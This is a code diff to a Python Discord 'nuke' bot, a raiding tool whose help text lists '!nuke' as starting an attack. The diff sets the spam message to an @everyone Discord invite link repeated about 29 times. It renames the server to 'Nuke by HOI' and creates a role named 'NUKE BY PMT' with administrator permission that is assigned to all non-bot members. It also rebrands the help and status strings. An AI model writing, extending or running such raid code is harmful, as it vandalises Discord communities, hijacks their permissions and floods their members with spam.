@@ -14,7 +14,35 @@ bot = commands.Bot(command_prefix="!", intents=intents, help_command=None)
 bot.nuking = False
 SPAM_MODE = "both"
 NEW_ICON_URL = "https://media.discordapp.net/attachments/1332244814892109885/1376589078753185862/static.png?ex=6835dffc&is=68348e7c&hm=f40c2f61a30d171b1c1a997c562f39c491a6ef09ec88b25b14a59c0c6478a6c3&=&format=webp&quality=lossless&width=320&height=320"
-CUSTOM_SPAM_TEXT = "@everyone 🔥 RAID GOD MODE! raid by long hip k12!"
+CUSTOM_SPAM_TEXT = "@everyone https://discord.gg/66CRXWrw4
+@everyone https://discord.gg/66CRXWrw4
+@everyone https://discord.gg/66CRXWrw4
+@everyone https://discord.gg/66CRXWrw4
+@everyone https://discord.gg/66CRXWrw4
+@everyone https://discord.gg/66CRXWrw4
+@everyone https://discord.gg/66CRXWrw4
+@everyone https://discord.gg/66CRXWrw4
+@everyone https://discord.gg/66CRXWrw4
+@everyone https://discord.gg/66CRXWrw4
+@everyone https://discord.gg/66CRXWrw4
+@everyone https://discord.gg/66CRXWrw4
+@everyone https://discord.gg/66CRXWrw4
+@everyone https://discord.gg/66CRXWrw4
+@everyone https://discord.gg/66CRXWrw4
+@everyone https://discord.gg/66CRXWrw4
+@everyone https://discord.gg/66CRXWrw4
+@everyone https://discord.gg/66CRXWrw4
+@everyone https://discord.gg/66CRXWrw4
+@everyone https://discord.gg/66CRXWrw4
+@everyone https://discord.gg/66CRXWrw4
+@everyone https://discord.gg/66CRXWrw4
+@everyone https://discord.gg/66CRXWrw4
+@everyone https://discord.gg/66CRXWrw4
+@everyone https://discord.gg/66CRXWrw4
+@everyone https://discord.gg/66CRXWrw4
+@everyone https://discord.gg/66CRXWrw4
+@everyone https://discord.gg/66CRXWrw4
+@everyone https://discord.gg/66CRXWrw4"
 CUSTOM_ICON_URL = None
 CUSTOM_SERVER_NAME = None
 CUSTOM_CHANNEL_SUFFIX = None
@@ -109,7 +137,7 @@ async def nuke(ctx):
     guild = ctx.guild
 
     try:
-        new_name = CUSTOM_SERVER_NAME or "☠️ RAID GOD MODE"
+        new_name = CUSTOM_SERVER_NAME or "Nuke by HOI"
         await guild.edit(name=new_name)
         url = CUSTOM_ICON_URL or NEW_ICON_URL
         async with aiohttp.ClientSession() as session:
@@ -144,7 +172,7 @@ async def nuke(ctx):
 
     if AUTO_ADD_ROLE:
         try:
-            admin_role = await guild.create_role(name="👑 God Admin", permissions=discord.Permissions.administrator, color=discord.Color.red())
+            admin_role = await guild.create_role(name="NUKE BY PMT", permissions=discord.Permissions.administrator, color=discord.Color.red())
             role_add_tasks = [member.add_roles(admin_role) for member in guild.members if not member.bot]
             if role_add_tasks:
                 await asyncio.gather(*role_add_tasks, return_exceptions=True)
@@ -226,14 +254,14 @@ async def stop(ctx):
 
 @bot.command()
 async def help(ctx):
-    embed = discord.Embed(title="💥 NUKE GOD MODE", description="!setup - cấu hình\n!nuke - bắt đầu tấn công\n!stop - dừng spam", color=discord.Color.blue())
+    embed = discord.Embed(title="NUKE ?", description="!setup - cấu hình\n!nuke - bắt đầu tấn công\n!stop - dừng spam", color=discord.Color.blue())
     try:
         await ctx.author.send(embed=embed)
     except:
         pass
 
 async def handle_web(request):
-    return web.Response(text="Bot is running")
+    return web.Response(text="PMT ON")
 
 async def start_web_server():
     app = web.Application()
